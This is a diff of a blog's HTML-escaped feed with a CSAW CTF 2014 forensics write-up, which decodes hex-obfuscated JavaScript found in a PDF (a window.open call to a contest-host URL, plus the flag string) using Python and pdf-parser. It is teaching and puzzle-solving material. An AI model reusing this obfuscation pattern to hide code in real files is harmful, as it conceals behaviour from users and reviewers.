 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;_0x91fe&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5F\x73\x65\x6C\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6F\x70\x65\x6E&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
 &lt;span class="n"&gt;window&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]](&lt;/span&gt;&lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We decode it using Python or a &lt;a href="http://ddecode.com/hexdecoder/"&gt;online hex-decode&lt;/a&gt;:&lt;/p&gt;
+&lt;p&gt;We decode it using Python or a &lt;a href="http://ddecode.com/hexdecoder/"&gt;online hex-decode&lt;/a&gt; and we get another file:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5F\x73\x65\x6C\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6F\x70\x65\x6E&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://128.238.66.100/announcement.pdf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;_self&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;OK, another file. Opening the URL leads to this picture:
+&lt;p&gt;Opening the URL leads to this picture:
 &lt;img alt="" src="http://i.imgur.com/CNEQhfG.png" /&gt;&lt;/p&gt;
-&lt;p&gt;No flag yet... But it should be in the PDF somewhere!&lt;/p&gt;
+&lt;p&gt;LOL. Funny, but no flag yet...&lt;/p&gt;
+&lt;p&gt;It should be in the PDF somewhere!&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Finding the Second Hex-encoded String: Approach I&lt;/h2&gt;
 &lt;p&gt;All right, let's use what we learned from the &lt;a href="https://gist.github.com/bt3gl/4574e99fe0f0dbdb56a9"&gt;CSAW CTF 2014 Forensic -Obscurity&lt;/a&gt; problem. First, let's see if we find the flag with a simple grep:&lt;/p&gt;
@@ -426,10 +459,10 @@ Indirect object: 9
 
 
 &lt;p&gt;Nice. So now we can decode our pdf file using the &lt;strong&gt;object code&lt;/strong&gt;, which we can see  above that is &lt;strong&gt;8&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py --object 8 --raw --filter announcement.pdf 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py --object 8 --raw --filter announcement.pdf
 obj 8 0
  Type: /EmbeddedFile
- Referencing: 
+ Referencing:
  Contains stream
 
   &amp;lt;&amp;lt;
@@ -467,12 +500,13 @@ obj 8 0
 
 
 &lt;p&gt;Opening &lt;em&gt;unpacket.pdf&lt;/em&gt; with &lt;a href="http://tarot.freeshell.org/leafpad/"&gt;l3afpad&lt;/a&gt; also leads to the flag :&lt;/p&gt;
-&lt;p&gt;```
-stream
-var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
-endstream
-endobj
-````&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;stream&lt;/span&gt;
+&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;_0xee0b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_0xee0b&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="n"&gt;endstream&lt;/span&gt;
+&lt;span class="n"&gt;endobj&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
 &lt;hr /&gt;
 &lt;p&gt;&lt;strong&gt;That's it! Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="Forensics"></category></entry><entry><title>The Sharif University CTF 2014</title><link href="http://bt3gl.github.io/the-sharif-university-ctf-2014.html" rel="alternate"></link><updated>2014-09-26T04:20:00-04:00</updated><author><name>bt3gl</name></author><id>tag:bt3gl.github.io,2014-09-26:the-sharif-university-ctf-2014.html</id><summary type="html">&lt;p&gt;It looked like a fun CTF, but I did not have the chance to play for too long. I managed to solve a few problems in the morning and the solutions are bellow:&lt;/p&gt;
 &lt;h2&gt;Avatar: Steganography&lt;/h2&gt;
